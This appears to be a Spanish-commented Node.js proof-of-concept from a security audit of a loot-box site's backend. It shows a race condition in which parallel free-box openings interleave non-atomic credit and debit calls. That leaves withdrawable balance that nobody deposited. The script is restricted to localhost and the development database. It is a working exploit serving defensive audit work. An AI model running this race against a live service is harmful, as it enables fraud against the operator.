/*
  LA APERTURA GRATIS CREA SC CANJEABLE DE LA NADA.

  `services/boxes/index.js:155-179` resuelve una apertura gratis en dos
  movimientos sobre el saldo comun:

      1. acredita el precio de la caja  (type: "promo_code")
      2. cobra la apertura              (type: "box_open")

  El comentario dice "el saldo queda igual --neto cero--", y en serie es
  cierto. En paralelo no: entre el paso 1 y el paso 2 el saldo esta
  inflado, y los pasos de varias aperturas se intercalan. Con saldo 0 y
  dos aperturas a la vez alcanza:

      A acredita +P      -> saldo P
      B cobra    -P      -> saldo 0     (B todavia no acredito)
      A cobra    -P      -> FALLA, no hay saldo; la excepcion sube
      B acredita +P      -> saldo P

  Queda P de saldo que nadie deposito. La gratis de A ya esta marcada
  como usada, y el credito de A no se revierte porque no hay vuelta
  atras: son dos llamadas sueltas a `wallet.mover`, no una transaccion.

  Y el SC que queda es canjeable: el credito va sin `bonoSc`, asi que no
  arrastra ninguna condicion de juego. Se puede pedir el retiro.

  Esto no necesita nada raro: una cuenta recien registrada viene con sus
  cajas de regalo, y el ataque es apretar "Abrir" en las tres pestanas
  casi al mismo tiempo.

  SOLO CONTRA LOCALHOST Y LA BASE DE DESARROLLO.

  Uso:  node audit/pocs/gratis-crea-plata.js  [rondas]
*/
const path = require("path");

const RAIZ = path.join(__dirname, "..", "..", "backend");
require(path.join(RAIZ, "node_modules", "dotenv")).config({ path: path.join(RAIZ, ".env") });

const mongoose = require(path.join(RAIZ, "node_modules", "mongoose"));
const API = "http://localhost:5001/api";
const RONDAS = Number(process.argv[2]) || 8;

function esLocal(uri) {
  return /127\.0\.0\.1|localhost/.test(String(uri)) && /mrbox_local/.test(String(uri));
}

(async () => {
  const uri = process.env.DATABASE_URI;
  if (!esLocal(uri)) {
    console.error("Esto solo corre contra la base local de desarrollo. Abortado.");
    process.exit(1);
  }

  await mongoose.connect(uri);

  const User = require(path.join(RAIZ, "database", "models", "User"));
  const BalanceTransaction = require(path.join(RAIZ, "database", "models", "BalanceTransaction"));
  const boxes = require(path.join(RAIZ, "services", "boxes"));
  const { firmar } = require(path.join(RAIZ, "middleware", "auth"));

  let conPlata = 0;
  let totalCreado = 0;

  console.log(`${RONDAS} cuentas nuevas, saldo 0, abriendo sus cajas de regalo a la vez:\n`);

  for (let r = 0; r < RONDAS; r += 1) {
    const marca = `poc_gratis_${Date.now()}_${r}`;

    const jugador = await User.create({
      username: marca,
      email: `${marca}@prueba.local`,
      passwordHash: "x".repeat(60),
      balanceSc: 0,
    });

    /* Las cajas de regalo que recibe cualquiera al registrarse. */
    await boxes.regalarCajasDeBienvenida(jugador._id);
    const regalos = await boxes.cajasGratisDe(jugador._id);
    if (!regalos.length) {
      console.log(`  ronda ${r + 1}: sin cajas de regalo configuradas, se saltea`);
      continue;
    }

    const token = firmar(jugador._id);

    /* Todas las gratis al mismo tiempo, que es lo que hace cualquiera
       con tres pestanas abiertas. */
    const salidas = await Promise.allSettled(
      regalos.map((g) =>
        fetch(`${API}/boxes/${g.slug}/open`, {
          method: "POST",
          headers: { "content-type": "application/json", "x-auth-token": token },
          body: JSON.stringify({ veces: 1 }),
        }).then((res) => res.json())
      )
    );

    const ok = salidas.filter((s) => s.status === "fulfilled" && s.value && s.value.success).length;

    const despues = await User.findById(jugador._id).select("+balanceSc +bonoPendienteSc").lean();
    const saldo = Number(despues.balanceSc || 0);
    const bono = Number(despues.bonoPendienteSc || 0);
    const canjeable = saldo - bono;

    const creditos = await BalanceTransaction.countDocuments({ user: jugador._id, type: "promo_code" });
    const cobros = await BalanceTransaction.countDocuments({ user: jugador._id, type: "box_open" });

    const marcaMal = canjeable > 0.001;
    if (marcaMal) {
      conPlata += 1;
      totalCreado += canjeable;
    }

    console.log(
      `  ronda ${String(r + 1).padStart(2)}: ${regalos.length} gratis, ${ok} aperturas OK  |  ` +
        `creditos ${creditos} / cobros ${cobros}  |  saldo canjeable SC ${canjeable.toFixed(2)}` +
        (marcaMal ? "   <<<< PLATA CREADA" : "")
    );
  }

  console.log("");
  if (conPlata) {
    console.log(`CONFIRMADO: ${conPlata} de ${RONDAS} cuentas terminaron con SC canjeable`);
    console.log(`sin haber depositado nada. Total creado: SC ${totalCreado.toFixed(2)}.`);
    console.log("");
    console.log("Ese saldo no arrastra condicion de juego: se puede pedir el retiro.");
  } else {
    console.log(`Ninguna de las ${RONDAS} cuentas creo saldo. Probar con mas rondas:`);
    console.log("la carrera depende de como se intercalen los pedidos.");
  }

  await mongoose.disconnect();
})().catch((e) => {
  console.error(e);
  process.exit(1);
});
